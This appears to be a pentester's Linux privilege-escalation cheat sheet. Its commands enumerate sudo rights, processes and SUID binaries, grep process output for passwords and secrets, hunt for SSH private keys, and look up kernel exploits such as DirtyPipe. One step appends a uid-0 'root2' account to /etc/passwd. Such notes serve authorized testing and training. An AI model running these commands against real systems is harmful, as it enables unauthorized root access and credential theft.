# Run linpeas
./linpeas.sh

# Check sudo rights
sudo -l

# Check running processes with pspy and grep for strings
./pspy64 -pf -i 1000 > processes.txt
cat processes.txt | grep -i pass
cat processes.txt | grep -i cred
cat processes.txt | grep -i user
cat processes.txt | grep -i secret

# Inspect the cron log file for running cron jobs
grep "CRON" /var/log/syslog

# Find writeable folders
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# Check write access to /etc/passwd
ls -lat /etc/passwd

# Generate a hash of the password w00t and insert it into the passwd file for a user with root privs.
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2

# Switch user (Instance where I found cred to another user but could not SSH to it)
su user


```

### Inspecting User Trails
```bash

# Environmental variables
env

# History
history

# Intresting files
cat .profile
cat .bashrc
ls /home/user/.ssh/id_rsa
# NOTE that not all SSH keys are named id_rsa!!
/home/user/.ssh/id_ecdsa

# search for compressed files
find  / -name *.zip* 2>/dev/null
find  / -name *.tar* 2>/dev/null

# Check /opt/ for installed programs
ls -lat /opt/


```

### SUID & SGID

```bash

# Enumerate executalbes with SUID set
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

#Enumerate the target to find binaries with capabilities
/usr/sbin/getcap -r / 2>/dev/null

# Check GTFObin

# If I find unknown SUID binaries look for the files/directory
SUID
/usr/local/bin/doasedit (Unknown SUID binary!)
find / -name *doas* 2>/dev/null
	/usr/local/etc/doas.conf
		permit nopass andrew as root cmd service args apache24 onestart
		
```

### Kernel exploits

```bash

# Check exploits suggested by linpeas

# Check kernel version and possible exploits
cat /etc/issue
	Ubuntu 20.04.5 LTS \n \l
uname -r
	5.9.0-050900-generic
	
# Try to use searchsploit and grep but be aware of many results
searchsploit "linux kernel Local Privilege Escalation"   | grep  "5." | grep -v " < 5.15" | grep "5.9"

# Try for the specific kernel version and try 1-5 numbers under and over E.g.
searchsploit "linux kernel Local Privilege Escalation"   | grep  "5.9"
searchsploit "linux kernel Local Privilege Escalation"   | grep  "5.8"
	Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)
	
# Previously had to try multiple kernel exploits before finding the right one!
